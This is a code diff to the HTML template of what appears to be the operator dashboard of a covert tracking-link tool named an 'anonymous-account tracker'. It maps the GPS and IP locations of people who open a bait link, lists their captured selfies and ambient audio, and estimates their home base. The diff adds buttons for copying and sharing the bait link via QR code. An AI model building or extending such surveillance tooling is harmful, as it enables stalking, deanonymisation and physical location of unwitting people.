@@ -22,18 +22,62 @@ td,th{border-bottom:1px solid #232734;padding:4px;text-align:left}
 a{color:#4c8dff}
 #ipwarn{display:none;margin:10px 0;padding:9px 12px;border-radius:10px;
   background:#2a2113;color:#f0b429;font-size:12px;line-height:1.6}
+.nav{display:flex;flex-wrap:wrap;gap:7px;margin:0 0 12px}
+.nav a,.nav button{display:inline-block;padding:7px 13px;border-radius:8px;background:#2b3346;
+  color:#c7cddb;text-decoration:none;font-size:12px;border:0;cursor:pointer;font-family:inherit}
+.nav a.p,.nav button.p{background:#4c8dff;color:#fff}
+.nav a.back{background:#3a2b46;color:#e0c7ff}
 </style></head><body><div class="wrap">
 <h1>監視室 — {{ link.person or link.name }}
   <small style="color:#8b93a7">/{{ code }}</small></h1>
+
+<div class="nav">
+  <a class="p" href="/l/{{ code }}" target="_blank">このリンクを開く</a>
+  <button id="cp">リンクをコピー</button>
+  <a href="/">裏垢トラッカー</a>
+  <a href="/tracks">追跡一覧</a>
+  <a href="/link/{{ code }}">リンク詳細</a>
+  <a href="/track/{{ code }}">軌跡</a>
+  <a href="/link/{{ code }}/qr.png" target="_blank">QR</a>
+</div>
+
 <div id="map"></div>
 <div id="ipwarn"></div>
 <div class="grid" id="cards"></div>
 <h3>取得物（自撮り・環境音）</h3><div class="caps" id="caps"></div>
 <h3>拠点推定</h3><div id="spots"></div>
 <h3>リピーター</h3><div id="rep"></div>
+
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
 var CODE = {{ code|tojson }};
+var LINK_URL = location.origin + "/l/" + CODE;
+
+(function () {
+  var b = document.getElementById("cp");
+  if (!b) return;
+  function done() {
+    b.textContent = "コピーしました";
+    setTimeout(function () { b.textContent = "リンクをコピー"; }, 1600);
+  }
+  function fallback() {
+    try {
+      var t = document.createElement("textarea");
+      t.value = LINK_URL;
+      t.style.cssText = "position:fixed;left:-9999px";
+      document.body.appendChild(t); t.select();
+      document.execCommand("copy"); t.remove(); done();
+    } catch (e) {}
+  }
+  b.addEventListener("click", function () {
+    try {
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(LINK_URL).then(done).catch(fallback);
+      } else fallback();
+    } catch (e) { fallback(); }
+  });
+})();
+
 var map = L.map('map').setView([36.2, 138.2], 5);
 L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',
   {maxZoom:19, attribution:'OSM'}).addTo(map);
@@ -87,9 +131,9 @@ function load(){
     if (ll.length>1){ line = L.polyline(ll,{color:'#4c8dff'}).addTo(map);
       map.fitBounds(line.getBounds(),{padding:[24,24]}); }
     else if (ll.length===1){ map.setView(ll[0],16); }
-    ll.forEach(function(p,i){
-      var ip = pts[i].src === 'ip';
-      L.circleMarker(p,{radius:3,color:ip?'#f0b429':'#4c8dff'}).addTo(layer);
+    pts.forEach(function(p){
+      L.circleMarker([p.lat,p.lon],{radius:3,color:p.src==='ip'?'#f0b429':'#4c8dff'})
+       .addTo(layer);
     });
     if (t.last && t.last.lat!=null){
       L.marker([t.last.lat,t.last.lon]).addTo(layer)
@@ -97,7 +141,9 @@ function load(){
                   '<br>'+(t.last.src==='ip'?'IP推定':'GPS'));
     }
     var w = document.getElementById('ipwarn');
-    if (w && t.warn && w.style.display==='none') { w.style.display='block'; w.textContent='⚠ '+t.warn; }
+    if (w && t.warn && w.style.display==='none') {
+      w.style.display='block'; w.textContent='⚠ '+t.warn;
+    }
   }).catch(function(){});
 }
 load(); setInterval(load, 10000);
